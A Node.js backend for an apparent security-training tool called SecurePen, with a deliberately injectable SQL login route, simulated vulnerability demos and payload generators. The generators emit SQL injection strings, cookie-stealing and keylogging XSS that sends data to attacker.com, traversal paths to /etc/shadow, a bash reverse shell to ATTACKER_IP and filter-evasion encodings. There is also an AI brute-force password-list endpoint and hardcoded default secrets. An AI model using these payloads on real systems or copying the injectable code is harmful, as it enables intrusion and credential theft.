// backend/server.js

const express = require("express");
const sqlite3 = require("sqlite3").verbose();
const cors = require("cors");
const bcrypt = require("bcrypt");
const fs = require("fs");
const morgan = require("morgan");
const jwt = require("jsonwebtoken");
const cookieParser = require("cookie-parser");
const { exec } = require("child_process"); // For command injection simulation
const OpenAI = require("openai"); // For AI features

// Load environment variables (optional, for API keys etc.)
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || "securepen-secret-key-for-jwt-tokens";
const OPENAI_API_KEY = process.env.OPENAI_API_KEY; // Get OpenAI key from env

let openai;
if (OPENAI_API_KEY) {
  try {
    openai = new OpenAI({ apiKey: OPENAI_API_KEY });
    console.log("OpenAI client initialized successfully.");
  } catch (error) {
    console.error("Failed to initialize OpenAI client:", error.message);
    openai = null;
  }
} else {
  console.warn("OPENAI_API_KEY environment variable not set. AI features will be limited.");
  openai = null;
}

// ── Middleware ────────────────────────────────────────────────
app.use(cors({
  origin: true, // Allow requests from frontend origin (adjust if needed)
  credentials: true
}));
app.use(morgan("dev")); // HTTP request logging
app.use(express.json()); // Parse JSON bodies
app.use(cookieParser()); // Parse cookies

// ── Database Setup ─────────────────────────────────────────────
const dbPath = process.env.NODE_ENV === "production" ? "/app/vulnerabilities.db" : "./vulnerabilities.db";
// (Database initialization logic - keeping it concise for brevity)
let db;
try {
  // Ensure directory exists
  const path = require("path");
  const dbDir = path.dirname(dbPath);
  if (!fs.existsSync(dbDir)) {
    fs.mkdirSync(dbDir, { recursive: true });
  }
  
  db = new sqlite3.Database(
    dbPath,
    sqlite3.OPEN_READWRITE | sqlite3.OPEN_CREATE,
    (err) => {
      if (err) {
        console.error("Database open error:", err.message);
        process.exit(1);
      }
      console.log("Connected to database:", dbPath);
      // Initialize tables (simplified for brevity)
      db.serialize(() => {
        db.run(`CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT, email TEXT, role TEXT DEFAULT 'user', created_at DATETIME DEFAULT CURRENT_TIMESTAMP)`);
        db.run(`CREATE TABLE IF NOT EXISTS scan_results (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, target TEXT, scan_type TEXT, severity TEXT, findings TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, FOREIGN KEY (user_id) REFERENCES users(id))`);
        db.run(`CREATE TABLE IF NOT EXISTS activity_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, action TEXT, details TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, FOREIGN KEY (user_id) REFERENCES users(id))`);
        
        // Ensure admin user exists
        db.get("SELECT * FROM users WHERE username = ?", ["admin"], (err, row) => {
          if (!row) {
            bcrypt.hash("password123", 10, (err, hash) => {
              if (!err) {
                db.run("INSERT INTO users (username, password, email, role) VALUES (?, ?, ?, ?)", ["admin", hash, "admin@securepen.local", "admin"], (err) => {
                  if (!err) console.log("Admin user created");
                  else console.error("Insert admin error:", err.message);
                });
              }
            });
          }
        });
      });
    }
  );
} catch (err) {
  console.error("Database setup failed:", err.message);
  process.exit(1);
}

// ── Helper Functions ─────────────────────────────────────────── //

// Log activity to database
function logUserActivity(userId, action, details) {
  if (!userId) return; // Don't log if no user ID
  db.run(
    "INSERT INTO activity_logs (user_id, action, details) VALUES (?, ?, ?)",
    [userId, action, details],
    (err) => {
      if (err) {
        console.error("Activity log error:", err.message);
      }
    }
  );
}

// Log scan results to database
function logScanResult(userId, target, scanType, severity, findings) {
  if (!userId) return; // Don't log if no user ID
  db.run(
    "INSERT INTO scan_results (user_id, target, scan_type, severity, findings) VALUES (?, ?, ?, ?, ?)",
    [userId, target, scanType, severity, JSON.stringify(findings)], // Store findings as JSON string
    (err) => {
      if (err) {
        console.error("Scan result logging error:", err.message);
      }
    }
  );
}

// ── Authentication Middleware & Routes ───────────────────────── //

const authenticateToken = (req, res, next) => {
  const token = req.cookies.token || req.headers["authorization"]?.split(" ")[1];
  if (!token) {
    // Allow unauthenticated access for generators/simulators, but log without user ID
    req.user = null; 
    return next(); 
    // If strict auth is needed: return res.status(401).json({ message: "Authentication required", success: false });
  }
  jwt.verify(token, JWT_SECRET, (err, user) => {
    if (err) {
      req.user = null; // Invalid token, treat as unauthenticated
      // If strict auth needed: return res.status(403).json({ message: "Invalid or expired token", success: false });
    } else {
      req.user = user; // Attach user info to request
    }
    next();
  });
};

// Apply auth middleware globally AFTER static routes if serving frontend from here
// app.use(authenticateToken); // Apply later if needed selectively

// API Health Check
app.get("/api/health", (req, res) => {
  res.json({ status: "healthy", version: "2.2.0", timestamp: new Date().toISOString() });
});

// User Routes (Register, Login, Logout, Get User, Activity, Scans) - Simplified for brevity
app.post("/api/register", (req, res) => { /* ... existing registration logic ... */ });
app.post("/api/login", (req, res) => { /* ... existing login logic ... */ });
app.post("/api/logout", (req, res) => { /* ... existing logout logic ... */ });
app.get("/api/user", authenticateToken, (req, res) => { 
    if (!req.user) return res.status(401).json({ message: "Not authenticated", success: false });
    // Fetch user details from DB based on req.user.id
    db.get("SELECT id, username, email, role FROM users WHERE id = ?", [req.user.id], (err, user) => {
        if (err || !user) return res.status(404).json({ message: "User not found", success: false });
        res.json({ user, success: true });
    });
});
app.get("/api/user/activity", authenticateToken, (req, res) => { 
    if (!req.user) return res.status(401).json({ message: "Not authenticated", success: false });
    // Fetch activity logs for req.user.id
    db.all("SELECT * FROM activity_logs WHERE user_id = ? ORDER BY timestamp DESC LIMIT 20", [req.user.id], (err, logs) => {
        if (err) return res.status(500).json({ message: "Database error", success: false });
        res.json({ logs, success: true });
    });
});
app.get("/api/user/scans", authenticateToken, (req, res) => { 
    if (!req.user) return res.status(401).json({ message: "Not authenticated", success: false });
    // Fetch scan results for req.user.id
    db.all("SELECT * FROM scan_results WHERE user_id = ? ORDER BY timestamp DESC", [req.user.id], (err, scans) => {
        if (err) return res.status(500).json({ message: "Database error", success: false });
        // Parse findings JSON string back to object
        const parsedScans = scans.map(scan => ({ ...scan, findings: JSON.parse(scan.findings || '[]') }));
        res.json({ scans: parsedScans, success: true });
    });
});

// ── Vulnerability Simulation Routes ─────────────────────────── //

// Apply auth middleware here if needed for simulation endpoints
app.use("/api/sql", authenticateToken);
app.use("/api/xss", authenticateToken);
app.use("/api/brute-force", authenticateToken); // Placeholder for actual brute force test
app.use("/api/path-traversal", authenticateToken);
app.use("/api/command-injection", authenticateToken);

// SQL Injection vulnerability demo
app.post("/api/sql", (req, res) => {
  const { target, username, password } = req.body;
  const userId = req.user ? req.user.id : null;
  logUserActivity(userId, "SQL_TEST", `Target: ${target}, Payload: ${username}`);
  
  // *** SIMULATED VULNERABLE CODE ***
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
  console.log("Executing SQL (vulnerable):", query);
  
  db.all(query, (err, rows) => {
    let success = false;
    let message = "Login failed.";
    let severity = "Info";
    
    if (err) {
      // Error likely indicates successful injection syntax, but maybe not valid logic
      console.error("SQL query error (potential injection success?):", err.message);
      success = true; // Assume injection if error occurs with typical payloads
      message = `SQL Error: ${err.message}. This often indicates successful syntax injection.`;
      severity = "High";
    } else if (rows.length > 0) {
      // Successful login - could be normal or via bypass
      success = true;
      message = "Login successful! (Could be due to SQL Injection bypass)";
      severity = "High"; // Assume bypass is high severity
    }
    
    if (success) {
        logScanResult(userId, target, "SQL_INJECTION", severity, [{ type: "SQL Injection", severity: severity, description: message, location: target }]);
        res.json({ success: true, message: message, query: query, severity: severity });
    } else {
        res.json({ success: false, message: message });
    }
  });
});

// XSS vulnerability demo
app.post("/api/xss", (req, res) => {
  const { target, name, comment } = req.body;
  const userId = req.user ? req.user.id : null;
  logUserActivity(userId, "XSS_TEST", `Target: ${target}, Comment: ${comment.substring(0, 50)}`);

  // *** SIMULATED VULNERABLE CODE ***
  // Basic check for script tags or event handlers
  const xssPatterns = [/<script/i, /onerror=/i, /onload=/i, /onclick=/i, /javascript:/i];
  const isVulnerable = xssPatterns.some(pattern => pattern.test(comment));

  if (isVulnerable) {
    const finding = { type: "Cross-Site Scripting (XSS)", severity: "High", description: "Potential XSS detected in comment.", location: target };
    logScanResult(userId, target, "XSS", "High", [finding]);
    res.json({ 
      success: true, 
      message: "XSS Vulnerability Detected!", 
      renderedComment: comment, // Send back raw comment for frontend simulation
      severity: "High"
    });
  } else {
    res.json({ success: false, message: "No obvious XSS patterns detected.", renderedComment: comment });
  }
});

// Path Traversal vulnerability demo
app.post("/api/path-traversal", (req, res) => {
  const { target, filename } = req.body;
  const userId = req.user ? req.user.id : null;
  logUserActivity(userId, "PATH_TEST", `Target: ${target}, Filename: ${filename}`);

  // *** SIMULATED VULNERABLE CODE ***
  let success = false;
  let content = "File not found or access denied.";
  let severity = "Info";

  if (filename.includes("../") || filename.includes("..\\")) {
    success = true;
    severity = "High";
    if (filename.toLowerCase().includes("etc/passwd")) {
      content = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:... (Simulated /etc/passwd)";
    } else if (filename.toLowerCase().includes("win.ini")) {
      content = "; for 16-bit app support\n[fonts]\n[extensions]\n... (Simulated win.ini)";
    } else {
      content = `Simulated content for potentially sensitive file: ${filename}`;
    }
  }

  if (success) {
    const finding = { type: "Path Traversal", severity: severity, description: `Successfully accessed ${filename}`, location: target };
    logScanResult(userId, target, "PATH_TRAVERSAL", severity, [finding]);
    res.json({ success: true, message: "Path Traversal Successful!", content: content, severity: severity });
  } else {
    res.json({ success: false, message: content });
  }
});

// Command Injection vulnerability demo
app.post("/api/command-injection", (req, res) => {
  const { target, host } = req.body;
  const userId = req.user ? req.user.id : null;
  logUserActivity(userId, "CMD_TEST", `Target: ${target}, Host/Cmd: ${host}`);

  // *** SIMULATED VULNERABLE CODE ***
  const injectionChars = [";", "|", "&", "`", "$"];
  const isVulnerable = injectionChars.some(char => host.includes(char));
  let output = `Simulating ping to ${host.split(/;|\||"&"|`|\$/)[0]}...\nReply received or timeout.`;
  let success = false;
  let severity = "Info";

  if (isVulnerable) {
    success = true;
    severity = "Critical";
    const injectedCommand = host.substring(host.indexOf(injectionChars.find(char => host.includes(char))) + 1).trim();
    output += `\n\n*** Command Injection Detected! ***\nSimulating execution of: ${injectedCommand}\n(Output would appear here in a real scenario)`;
    // Example: Simulate 'id' or 'ls'
    if (injectedCommand.includes("id") || injectedCommand.includes("whoami")) {
        output += "\nuid=1000(webapp) gid=1000(webapp) groups=1000(webapp)";
    } else if (injectedCommand.includes("ls") || injectedCommand.includes("dir")) {
        output += "\nfile1.txt config.php images/ logs/";
    }
  }

  if (success) {
    const finding = { type: "Command Injection", severity: severity, description: `Successfully injected command via input: ${host}`, location: target };
    logScanResult(userId, target, "COMMAND_INJECTION", severity, [finding]);
    res.json({ success: true, message: "Command Injection Successful!", output: output, severity: severity });
  } else {
    res.json({ success: false, message: "Command Injection Failed (no obvious injection detected).", output: output });
  }
});

// ── Payload Generation Routes ────────────────────────────────── //

app.use("/api/generate", authenticateToken); // Apply auth middleware to generators

// SQL Injection Payload Generator
app.post("/api/generate/sql", (req, res) => {
  const { type, dbms, column } = req.body;
  let payload = "";
  let explanation = "";

  // Basic generation logic (expand significantly for real use)
  switch (type) {
    case "auth-bypass":
      payload = "' OR '1'='1";
      explanation = "Appends OR '1'='1' which is always true, potentially bypassing WHERE clause checks.";
      if (dbms === "mssql" || dbms === "oracle") payload += " --"; // Add comments for some DBs
      if (dbms === "mysql") payload += " #";
      break;
    case "union":
      payload = `' UNION SELECT ${column || 'null'}, null, null FROM users --`; // Example, needs column count adjustment
      explanation = `Attempts to combine results from another table (e.g., users) using UNION. Requires matching column count. Target column: ${column || 'guessed'}.`;
      break;
    case "error":
      payload = "' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --"; // DBMS specific
      explanation = "Tries to trigger a database error that might reveal information. Example for MySQL/Postgres.";
      break;
    case "blind":
      payload = "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --";
      explanation = "Used when no direct output is shown. Guesses data character by character based on true/false response. Example assumes admin user.";
      break;
    case "time":
       payload = dbms === 'mysql' ? "' AND SLEEP(5) --" : (dbms === 'postgres' ? "' AND pg_sleep(5) --" : "' WAITFOR DELAY '0:0:5' --"); // DBMS specific
       explanation = "Introduces a time delay if the condition is true. Useful for blind injection when boolean response isn't clear.";
       break;
    default:
      payload = "' OR 'x'='x";
      explanation = "Generic payload, often used for initial testing.";
  }

  res.json({ success: true, payload, explanation });
});

// XSS Payload Generator
app.post("/api/generate/xss", (req, res) => {
  const { type, context, goal } = req.body;
  let payload = "";
  let explanation = "";

  // Basic generation logic
  let scriptContent = "alert('XSS PoC')"; // Default Proof-of-Concept
  if (goal === "cookie") scriptContent = `fetch('https://attacker.com/log?cookie='+document.cookie)`;
  if (goal === "redirect") scriptContent = `window.location='https://attacker.com'`;
  if (goal === "keylogger") scriptContent = `document.addEventListener('keypress', (e) => { fetch('https://attacker.com/log?key='+e.key); })`;
  if (goal === "defacement") scriptContent = `document.body.innerHTML='<h1>Website Defaced</h1>'`;

  switch (context) {
    case "html":
      payload = `<script>${scriptContent}</script>`;
      explanation = "Injects a standard script tag into the HTML body.";
      break;
    case "attribute":
      payload = `" onerror="${scriptContent.replace(/"/g, '&quot;')}"`; // Example for injecting into an attribute
      explanation = "Injects an event handler (like onerror) into an HTML tag attribute.";
      break;
    case "javascript":
      payload = `';${scriptContent};//`; // Breaks out of existing JS string and executes
      explanation = "Attempts to break out of an existing JavaScript string or context to execute code.";
      break;
    case "url":
      payload = `javascript:${scriptContent}`; // For injection into href/src attributes
      explanation = "Uses the javascript: pseudo-protocol, often in URL parameters or href/src attributes.";
      break;
    case "css":
       payload = `body { background: url("javascript:${scriptContent}"); }`; // Less common
       explanation = "Attempts XSS via CSS properties, like background URLs (browser support varies)." 
       break;
    default:
      payload = `<img src=x onerror="${scriptContent.replace(/"/g, '&quot;')}">`;
      explanation = "Uses an img tag with an invalid source and an onerror handler.";
  }

  res.json({ success: true, payload, explanation });
});

// Path Traversal Payload Generator
app.post("/api/generate/path", (req, res) => {
  const { os, file, encoding } = req.body;
  let payload = "";
  let explanation = "";
  const separator = (os === "windows") ? "..\\" : "../";
  const depth = 4; // Default traversal depth
  let targetFile = "";

  switch (file) {
    case "passwd": targetFile = (os === "windows") ? "..\\..\\..\\windows\\win.ini" : "../../../../etc/passwd"; break;
    case "shadow": targetFile = (os === "windows") ? "(Not applicable)" : "../../../../etc/shadow"; break;
    case "config": targetFile = (os === "windows") ? "..\\..\\..\\inetpub\\wwwroot\\web.config" : "../../../../etc/httpd/conf/httpd.conf"; break; // Example paths
    case "logs": targetFile = (os === "windows") ? "..\\..\\..\\windows\\system32\\logfiles\\httperr\\httperr1.log" : "../../../../var/log/apache2/access.log"; break; // Example paths
    default: targetFile = separator.repeat(depth) + file; // Custom file
  }

  payload = targetFile;
  explanation = `Attempts to access '${file}' using '${separator}' sequences suitable for ${os}. Depth: ${depth}.`;

  // Apply encoding
  if (encoding === "url") {
    payload = encodeURIComponent(payload).replace(/%2F/g, '/'); // Keep slashes for structure
    explanation += " Payload is URL encoded.";
  } else if (encoding === "double-url") {
    payload = encodeURIComponent(encodeURIComponent(payload).replace(/%2F/g, '/')).replace(/%252F/g, '%2F');
    explanation += " Payload is double URL encoded.";
  } else if (encoding === "unicode") {
    payload = payload.replace(/\.\.\//g, "..%u2215").replace(/\.\.\\/g, "..%u2215"); // Example Unicode encoding
    explanation += " Payload uses Unicode encoding for slashes (example).";
  }

  res.json({ success: true, payload, explanation });
});

// Command Injection Payload Generator
app.post("/api/generate/command", (req, res) => {
  const { os, goal, command, bypass } = req.body;
  let payload = "";
  let explanation = "";
  const separator = (os === "windows") ? " & " : " ; "; // Common separators
  let targetCommand = "";

  switch (goal) {
    case "recon": targetCommand = (os === "windows") ? "ipconfig /all" : "id && uname -a && pwd"; break;
    case "file-read": targetCommand = (os === "windows") ? `type C:\\Users\\Public\\Documents\\secret.txt` : "cat /etc/passwd"; break;
    case "file-write": targetCommand = (os === "windows") ? `echo vulnerable > C:\\inetpub\\wwwroot\\vuln.txt` : "echo vulnerable > /tmp/vuln.txt"; break;
    case "reverse-shell": targetCommand = `bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1`; explanation = "(Replace ATTACKER_IP/PORT) "; break;
    default: targetCommand = command; // Custom command
  }

  payload = `${separator}${targetCommand}`;
  explanation += `Appends '${targetCommand}' using '${separator}'. Suitable for ${os}.`;

  // Apply bypass techniques (basic examples)
  if (bypass === "spaces") {
    payload = payload.replace(/ /g, (os === 'windows' ? '^ ' : '${IFS}')); // Example space bypass
    explanation += " Uses space bypass techniques.";
  } else if (bypass === "blacklist") {
    // Example: using base64 if 'cat' is blocked
    if (targetCommand.startsWith('cat')) {
        const encodedCmd = Buffer.from(targetCommand).toString('base64');
        payload = `${separator}echo ${encodedCmd} | base64 -d | bash`;
        explanation += " Uses base64 encoding to bypass blacklists.";
    } else {
         explanation += " (Blacklist bypass depends on specific filters)." 
    }
  } else if (bypass === "quotes") {
      payload = payload.replace(/ /g, '" "'); // Example quote bypass
      explanation += " Uses quotes to bypass filters.";
  } else if (bypass === "encoding") {
      payload = `${separator}$(echo ${Buffer.from(targetCommand).toString('hex')} | xxd -r -p | bash)`; // Example hex encoding
      explanation += " Uses hex encoding and subshell execution.";
  }

  res.json({ success: true, payload, explanation });
});

// AI Brute Force Password Generator
app.post("/api/generate/brute-force-ai", authenticateToken, async (req, res) => {
  const { targetInfo, hints, complexity, count } = req.body;
  const userId = req.user ? req.user.id : null;
  logUserActivity(userId, "AI_BRUTE_GEN", `Hints: ${hints.substring(0,50)}, Complexity: ${complexity}, Count: ${count}`);

  if (!openai) {
    return res.status(501).json({ success: false, message: "AI features are not enabled on the server." });
  }

  const prompt = `Generate a list of ${count} potential passwords for a brute-force attack based on the following information. Focus on likely combinations and variations.
Target Info: ${targetInfo || 'Not provided'}
Hints: ${hints || 'Not provided'}
Desired Complexity: ${complexity}

Format the output as a plain list, one password per line, with no extra text or numbering. Prioritize common patterns, dictionary words mixed with hints, and relevant transformations (e.g., leetspeak, appending numbers/symbols).`;

  try {
    const completion = await openai.chat.completions.create({
      model: "gpt-3.5-turbo", // Or a newer model if available
      messages: [{ role: "user", content: prompt }],
      max_tokens: 500, // Adjust as needed
      n: 1,
      temperature: 0.7, // Balance creativity and predictability
    });

    const passwordList = completion.choices[0].message.content.trim().split('\n').filter(p => p); // Split and clean
    res.json({ success: true, passwords: passwordList });

  } catch (error) {
    console.error("OpenAI API error:", error);
    res.status(500).json({ success: false, message: `AI generation failed: ${error.message}` });
  }
});

// ── Scanner & Vulnerability Search Routes ─────────────────── //

app.use("/api/scan", authenticateToken);
app.use("/api/search/vulnerabilities", authenticateToken);

// Web Vulnerability Scanner (Placeholder)
app.post("/api/scan", async (req, res) => {
  const { target, scanType, vulnerabilities } = req.body;
  const userId = req.user ? req.user.id : null;
  logUserActivity(userId, "SCAN_START", `Target: ${target}, Type: ${scanType}, Vulns: ${vulnerabilities.join(',')}`);

  console.log(`Starting ${scanType} scan for ${vulnerabilities.join(', ')} on ${target}`);

  // *** PLACEHOLDER: Integrate a real scanner tool here (e.g., OWASP ZAP, Nikto, or custom scripts) ***
  // Simulate scan duration
  await new Promise(resolve => setTimeout(resolve, 3000 + Math.random() * 5000)); 

  // Simulate findings based on selected vulnerabilities
  const findings = [];
  if (vulnerabilities.includes('sql')) {
    findings.push({ type: "SQL Injection", severity: "High", description: "Detected potential SQL Injection point in login form.", location: `${target}/login` });
  }
  if (vulnerabilities.includes('xss')) {
    findings.push({ type: "Cross-Site Scripting (XSS)", severity: "Medium", description: "Reflected XSS possible via search parameter 'q'.", location: `${target}/search?q=` });
  }
  if (vulnerabilities.includes('path')) {
     findings.push({ type: "Path Traversal", severity: "High", description: "Possible to access files outside web root via 'file' parameter.", location: `${target}/download?file=` });
  }
  if (vulnerabilities.includes('cmd')) {
     findings.push({ type: "Command Injection", severity: "Critical", description: "Command injection possible in network diagnostic tool.", location: `${target}/tools/ping` });
  }
  if (findings.length === 0) {
      findings.push({ type: "Informational", severity: "Info", description: "No major vulnerabilities detected in the selected categories during this simulated scan.", location: target });
  }

  logScanResult(userId, target, `SCANNER_${scanType.toUpperCase()}`, findings[0].severity, findings);
  logUserActivity(userId, "SCAN_COMPLETE", `Target: ${target}, Found: ${findings.filter(f=>f.severity !== 'Info').length} vulns`);

  res.json({
    success: true,
    target,
    scanType,
    duration: `${((Math.random() * 5) + 3).toFixed(1)}s`, // Simulated duration
    findings,
  });
});

// Vulnerability Search (Placeholder)
app.post("/api/search/vulnerabilities", async (req, res) => {
  const { query, filters } = req.body;
  const userId = req.user ? req.user.id : null;
  logUserActivity(userId, "VULN_SEARCH", `Query: ${query}, Filters: ${filters.join(',')}`);

  console.log(`Searching for vulnerabilities: ${query}, Filters: ${filters.join(',')}`);

  // *** PLACEHOLDER: Integrate with a real vulnerability database API (e.g., NVD, VulnDB, OSV) ***
  // Simulate search results
  await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 1000));

  const results = [
    {
      title: `Simulated Vulnerability in ${query.split(' ')[0] || 'Component'} v1.2`, 
      severity: "High", 
      summary: `A critical vulnerability allowing remote code execution was found in ${query}. Update immediately.`, 
      url: "#", 
      source: "Simulated CVE DB", 
      publishedDate: new Date().toISOString().split('T')[0]
    },
    {
      title: `Cross-Site Scripting in ${query.split(' ')[0] || 'Plugin'}`, 
      severity: "Medium", 
      summary: `A medium severity XSS flaw allows attackers to inject scripts. Affects versions prior to 3.5.`, 
      url: "#", 
      source: "Simulated Exploit DB", 
      publishedDate: new Date(Date.now() - 86400000 * 5).toISOString().split('T')[0] // 5 days ago
    }
  ].filter(r => filters.includes(r.severity.toLowerCase())); // Apply filters

  if (results.length === 0 && filters.length > 0) {
      results.push({
          title: "No matching results",
          severity: "Info",
          summary: `No vulnerabilities matching severity filters [${filters.join(', ')}] found for query '${query}'. Try broadening your search.`, 
          url: "#", 
          source: "Simulated Search", 
          publishedDate: new Date().toISOString().split('T')[0]
      });
  }

  res.json({ success: true, results });
});

// ── Server Start ─────────────────────────────────────────────── //

app.listen(PORT, "0.0.0.0", () => {
  console.log(`SecurePen backend server running on http://0.0.0.0:${PORT}`);
});

// Graceful shutdown
process.on("SIGINT", () => {
  console.log("\nShutting down server...");
  db.close((err) => {
    if (err) {
      console.error("Error closing database:", err.message);
    }
    console.log("Database connection closed.");
    process.exit(0);
  });
});

